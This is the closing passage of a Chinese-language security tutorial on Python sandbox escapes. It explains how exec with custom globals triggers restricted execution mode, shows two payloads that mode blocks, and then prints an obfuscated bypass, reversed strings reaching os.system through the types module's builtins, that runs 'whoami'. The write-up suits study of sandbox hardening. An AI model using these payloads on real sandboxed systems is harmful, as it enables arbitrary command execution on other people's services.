`exec command in _global` 这一句就把很多 payload 干掉了，由于 exec
运行在自定义的全局命名空间里，这时候会处于`restricted execution
mode`，这里不赘述了，感兴趣可以看这篇文章：[传送门](http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html)。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的
payload 是没法使用的，例如：

    
    
    >>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__
    restricted attribute
    >>> getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()
    file() constructor not accessible in restricted mode
    

不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 `__builtins__`，比如 types 库，来执行任意命令：

    
    
    >>> getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')
    macr0phag3
    

## 最后

这块内容本身就零散，罗里吧嗦了这么多，希望对大家有帮助，如果有不严谨的地方希望各位师傅们能指出来，共同探讨 。

 ***本文作者：Macr0phag3，本文属FreeBuf原创奖励计划，未经许可禁止转载。**

